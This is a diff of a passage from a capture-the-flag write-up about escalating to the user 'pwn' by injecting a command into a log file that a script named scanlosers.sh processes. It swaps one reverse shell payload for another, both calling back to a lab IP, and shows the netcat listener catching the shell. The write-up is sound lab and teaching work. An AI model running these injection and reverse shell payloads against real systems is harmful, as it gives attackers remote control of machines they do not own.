@@ -53,9 +53,17 @@ There is another user `pwn`, the plan was to find a way to this account. I used 
  ```
  $ nc -nvlp 4445
  ```
- This payload contains a reverse shell that we can push to the log file `hackers`. 
+Looking at the `scanlosers.sh` file in /home/pwn, the script is vulnerable to command injection. This payload contains a reverse shell that we can push to the log file `hackers`. 
  ```
- echo "1 2 ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4445 >/tmp/f #" >> hackers
+echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.3/4445 0>&1' # ." > hackers
+ ```
+ ```
+ $ nc -nvlp 4445
+Listening on 0.0.0.0 4445
+Connection received on 10.10.10.226 42332
+bash: cannot set terminal process group (866): Inappropriate ioctl for device
+bash: no job control in this shell
+pwn@scriptkiddie:~$ 
  ```
 ```
 TO BE CONTINUED  
